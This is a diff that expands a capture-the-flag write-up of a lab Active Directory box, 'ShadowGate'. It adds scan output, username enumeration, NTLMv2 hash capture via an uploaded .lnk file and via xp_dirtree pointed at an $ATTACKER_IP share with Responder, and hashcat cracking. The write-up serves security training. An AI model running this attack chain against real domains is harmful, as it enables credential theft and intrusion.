@@ -35,37 +35,88 @@ ShadowGate provides cybersecurity solutions for global enterprises. They are in 
 
 ### Port Scanning
 
+A standard version/script scan against the target:
+
 ```bash
 $ nmap -sCV 10.1.104.4
 ```
 
 ```
+Starting Nmap 7.93 ( https://nmap.org ) at 2026-07-17 09:46 PDT
+Nmap scan report for 10.1.104.4
+Host is up (0.077s latency).
+Not shown: 987 filtered tcp ports (no-response)
 PORT     STATE SERVICE       VERSION
 53/tcp   open  domain        Simple DNS Plus
 80/tcp   open  http          Microsoft IIS httpd 10.0
+|_http-server-header: Microsoft-IIS/10.0
 |_http-title: ShadowGate | Advanced Cyber Security Solutions
-88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
+| http-methods:
+|_  Potentially risky methods: TRACE
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-17 16:46:11Z)
 135/tcp  open  msrpc         Microsoft Windows RPC
 139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
-389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: shadowgate.local)
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: shadowgate.local0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=SG-DC01.shadowgate.local
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:SG-DC01.shadowgate.local
+| Not valid before: 2025-12-07T17:46:45
+|_Not valid after:  2026-12-07T17:46:45
+|_ssl-date: 2026-07-17T16:47:31+00:00; 0s from scanner time.
 445/tcp  open  microsoft-ds?
 464/tcp  open  kpasswd5?
 593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
 1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
-3268/tcp open  ldap          Microsoft Windows Active Directory LDAP
-3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP
+|_ssl-date: 2026-07-17T16:47:31+00:00; 0s from scanner time.
+|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
+|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
+| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
+| Not valid before: 2026-07-17T16:33:33
+|_Not valid after:  2056-07-17T16:33:33
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: shadowgate.local0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=SG-DC01.shadowgate.local
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:SG-DC01.shadowgate.local
+| Not valid before: 2025-12-07T17:46:45
+|_Not valid after:  2026-12-07T17:46:45
+|_ssl-date: 2026-07-17T16:47:31+00:00; 0s from scanner time.
+3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: shadowgate.local0., Site: Default-First-Site-Name)
+|_ssl-date: 2026-07-17T16:47:31+00:00; 0s from scanner time.
+| ssl-cert: Subject: commonName=SG-DC01.shadowgate.local
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:SG-DC01.shadowgate.local
+| Not valid before: 2025-12-07T17:46:45
+|_Not valid after:  2026-12-07T17:46:45
 3389/tcp open  ms-wbt-server Microsoft Terminal Services
 | rdp-ntlm-info:
+|   Target_Name: SHADOWGATE
 |   NetBIOS_Domain_Name: SHADOWGATE
 |   NetBIOS_Computer_Name: SG-DC01
 |   DNS_Domain_Name: shadowgate.local
-|_  Product_Version: 10.0.17763
-Service Info: Host: SG-DC01; OS: Windows
+|   DNS_Computer_Name: SG-DC01.shadowgate.local
+|   DNS_Tree_Name: shadowgate.local
+|   Product_Version: 10.0.17763
+|_  System_Time: 2026-07-17T16:46:51+00:00
+| ssl-cert: Subject: commonName=SG-DC01.shadowgate.local
+| Not valid before: 2026-07-06T16:10:27
+|_Not valid after:  2027-01-05T16:10:27
+|_ssl-date: 2026-07-17T16:47:31+00:00; 0s from scanner time.
+Service Info: Host: SG-DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode:
+|   311:
+|_    Message signing enabled and required
+| smb2-time:
+|   date: 2026-07-17T16:46:55
+|_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 92.50 seconds
 ```
 
 Kerberos, LDAP, and an MSSQL instance on the same host as an IIS site — a single box carrying the **Domain Controller, a web application, and a SQL Server** instance simultaneously.
 
 ### Hosts File
+
+The host drops ICMP and its SSL certificates advertise `SG-DC01.shadowgate.local`, so map the FQDN before doing anything Kerberos-dependent — `nxc` can generate the entry directly from its own SMB banner:
 
 ```bash
 $ nxc smb 10.1.104.4 -u '' -p '' /etc/hosts --generate-hosts-file /etc/hosts
@@ -89,33 +140,76 @@ The root site is ShadowGate's own marketing page — a cybersecurity vendor pitc
 
 ### Subdomain Enumeration
 
-Virtual-host fuzzing against the root site surfaces a hidden `dev` subdomain:
+Virtual-host fuzzing against the root site — filtering out the default response size — surfaces a hidden `dev` subdomain:
 
 ```bash
-$ ffuf -c -w namelist.txt -H 'Host: FUZZ.shadowgate.local' -u "http://10.1.104.4/" -fs 63405
+$ ffuf -c -w `fzf-wordlists` -H 'Host: FUZZ.shadowgate.local' -u "http://10.1.104.4/" -fs 63405
 ```
 
 ```
-dev  [Status: 200, Size: 14924, Words: 4761, Lines: 425, Duration: 987ms]
+
+        /'___\  /'___\           /'___\
+       /\ \__/ /\ \__/  __  __  /\ \__/
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+         \ \_\   \ \_\  \ \____/  \ \_\
+          \/_/    \/_/   \/___/    \/_/
+
+       v2.1.0
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://10.1.104.4/
+ :: Wordlist         : FUZZ: /opt/lists/seclists/Discovery/DNS/namelist.txt
+ :: Header           : Host: FUZZ.shadowgate.local
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter           : Response size: 63405
+________________________________________________
+
+dev                     [Status: 200, Size: 14924, Words: 4761, Lines: 425, Duration: 987ms]
 ```
+
+Browsing `dev.shadowgate.local` lands on a "Dev File Upload Portal" whose **File Upload Workflow** panel names a specific employee by first-name-dot-last-initial:
+
+```
+Security Review: All uploaded files are reviewed and processed by mitch.r
+```
+
+That single line is the whole username convention for the domain — `firstname.lastinitial`. It's enough to build a small candidate userlist (`mitch.r`, plus guesses for other likely employees) and confirm which of them actually exist in AD.
 
 ### User Enumeration
 
-`kerbrute` against a small username list confirms valid accounts:
-
 ```bash
-$ kerbrute userenum -d shadowgate.local --dc 10.1.104.4 userlist.txt
+$ kerbrute userenum -d shadowgate.local --dc 10.1.104.4 /workspace/userlist2.txt
 ```
 
 ```
-[+] VALID USERNAME:  mitch.r@shadowgate.local
-[+] VALID USERNAME:  daniel.r@shadowgate.local
-[+] VALID USERNAME:  milo.w@shadowgate.local
-[+] VALID USERNAME:  bogdan.r@shadowgate.local
-[+] VALID USERNAME:  ryan.j@shadowgate.local
-[+] VALID USERNAME:  oscar.m@shadowgate.local
-Done! Tested 7 usernames (6 valid) in 0.079 seconds
+
+    __             __               __
+   / /_____  _____/ /_  _______  __/ /____
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/
+
+Version: dev (n/a) - 07/17/26 - Ronnie Flathers @ropnop
+
+2026/07/17 10:43:01 >  Using KDC(s):
+2026/07/17 10:43:01 >   10.1.104.4:88
+
+2026/07/17 10:43:01 >  [+] VALID USERNAME:       mitch.r@shadowgate.local
+2026/07/17 10:43:01 >  [+] VALID USERNAME:       daniel.r@shadowgate.local
+2026/07/17 10:43:01 >  [+] VALID USERNAME:       milo.w@shadowgate.local
+2026/07/17 10:43:01 >  [+] VALID USERNAME:       bogdan.r@shadowgate.local
+2026/07/17 10:43:01 >  [+] VALID USERNAME:       ryan.j@shadowgate.local
+2026/07/17 10:43:01 >  [+] VALID USERNAME:       oscar.m@shadowgate.local
+2026/07/17 10:43:01 >  Done! Tested 7 usernames (6 valid) in 0.079 seconds
 ```
+
+Six confirmed accounts, all matching the `firstname.lastinitial` format identified from the dev portal.
 
 ---
 
@@ -123,15 +217,42 @@ Done! Tested 7 usernames (6 valid) in 0.079 seconds
 
 ### dev.shadowgate.local Enumeration
 
+With the username format in hand, content discovery against the `dev` vhost itself is next:
+
 ```bash
-$ feroxbuster -w big.txt -u "http://dev.shadowgate.local" -x pdf -x js,html -x php txt json docx aspx -C 404
+$ feroxbuster -w `fzf-wordlists` -u "http://dev.shadowgate.local" -x pdf -x js,html -x php txt json docx aspx -C 404
 ```
 
 ```
-200  GET  424l  1038w  14924c  http://dev.shadowgate.local/
-200  GET  424l  1038w  14934c  http://dev.shadowgate.local/login.aspx
-301  GET    2l    10w    158c  http://dev.shadowgate.local/upload => http://dev.shadowgate.local/upload/
-200  GET  803l  1911w  28619c  http://dev.shadowgate.local/upload/upload.aspx
+
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben "epi" Risher 🤓                 ver: 2.13.1
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://dev.shadowgate.local/
+ 🚩  In-Scope Url          │ dev.shadowgate.local
+ 🚀  Threads               │ 50
+ 📖  Wordlist              │ /usr/share/wfuzz/general/big.txt
+ 💢  Status Code Filters   │ [404]
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.13.1
+ 🔎  Extract Links         │ true
+ 💲  Extensions            │ [pdf, js, html, php, txt, json, docx, aspx]
+ 🏁  HTTP methods          │ [GET]
+ 🔃  Recursion Depth       │ 4
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+404      GET       29l       95w     1245c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+404      GET       59l      274w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+200      GET      424l     1038w    14924c http://dev.shadowgate.local/
+200      GET      424l     1038w    14934c http://dev.shadowgate.local/login.aspx
+301      GET        2l       10w      158c http://dev.shadowgate.local/upload => http://dev.shadowgate.local/upload/
+200      GET      803l     1911w    28619c http://dev.shadowgate.local/upload/upload.aspx
+[####################] - 85s    54567/54567   0s      found:4       errors:0
+[####################] - 44s    27216/27216   618/s   http://dev.shadowgate.local/
+[####################] - 43s    27216/27216   626/s   http://dev.shadowgate.local/upload/
 ```
 
 `/upload/upload.aspx` is reachable **without credentials** and automatically authenticates as `mitch.r`:
@@ -189,6 +310,8 @@ Uploading the generated **`.lnk`** file through the portal is enough — Windows
 
 ### Cracking NTLMv2
 
+The captured NetNTLMv2 hash is crackable entirely offline against a wordlist (mode `5600`):
+
 ```bash
 $ hashcat -m 5600 -a 0 mitch.r rockyou.txt
 ```
@@ -209,6 +332,8 @@ mitch.r:[REDACTED]
 ## Active Directory Enumeration
 
 ### BloodHound Collection
+
+With a real credential in hand, collect the domain graph as `mitch.r` to see what it's actually worth:
 
 ```bash
 $ bloodyAD --host SG-DC01 -d shadowgate.local -u 'mitch.r' -p '[REDACTED]' get bloodhound
@@ -301,13 +426,25 @@ SQL (SHADOWGATE\bogdan.r  guest@master)> SELECT IS_SRVROLEMEMBER('sysadmin');
 
 ### NTLMv2 Capture via xp_dirtree
 
-`xp_dirtree` forces the SQL Server service to authenticate to an attacker-controlled UNC path:
+`xp_dirtree` is an extended stored procedure that walks a directory tree at a given path — including a **UNC path**. Point it at a share that doesn't exist and SQL Server still has to *resolve* that path first, which means the service account itself performs an SMB authentication against whatever is listening there. With Responder running again on `tun0` (the same listener used to catch `mitch.r` earlier), that authentication lands directly in our lap — no user interaction required this time, just a SQL command:
+
+```bash
+$ responder --interface tun0
+```
 
 ```sql
 SQL (SHADOWGATE\bogdan.r  guest@master)> EXEC xp_dirtree '\\$ATTACKER_IP\share'
 ```
 
 ```
+subdirectory   depth
+------------   -----
+```
+
+The SQL query itself returns nothing (the path doesn't exist), but Responder catches the coerced authentication in the background:
+
+```
+[SMB] NTLMv2-SSP Client   : 10.1.104.4
 [SMB] NTLMv2-SSP Username : SHADOWGATE\bogdan.r
 [SMB] NTLMv2-SSP Hash     : bogdan.r::SHADOWGATE:[REDACTED]
 ```
@@ -416,15 +553,53 @@ FLAG[REDACTED]
 ### Full whoami
 
 ```
+*Evil-WinRM* PS C:\Users\oscar.m\desktop> whoami /all
+
+USER INFORMATION
+----------------
+
 User Name          SID
 ================== ==============================================
 shadowgate\oscar.m S-1-5-21-2396436576-3267128377-3646372360-1109
 
+
 GROUP INFORMATION
 -----------------
-BUILTIN\Remote Management Users             Alias
-SHADOWGATE\Shadowgate-IT-Support            Group
+
+Group Name                                  Type             SID                                            Attributes
+=========================================== ================ ============================================== ==================================================
+Everyone                                    Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                               Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
+BUILTIN\Certificate Service DCOM Access     Alias            S-1-5-32-574                                   Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization              Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
+SHADOWGATE\Shadowgate-IT-Support            Group            S-1-5-21-2396436576-3267128377-3646372360-1115 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
+Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
+
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== =======
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+
+
+USER CLAIMS INFORMATION
+-----------------------
+
+User claims unknown.
+
+Kerberos support for Dynamic Access Control on this device has been disabled.
 ```
+
+`oscar.m`'s only non-default group is **Shadowgate-IT-Support** — the membership that turns out to matter later, when it grants visibility into deleted AD objects that's normally locked to Domain Admins.
 
 ---
 
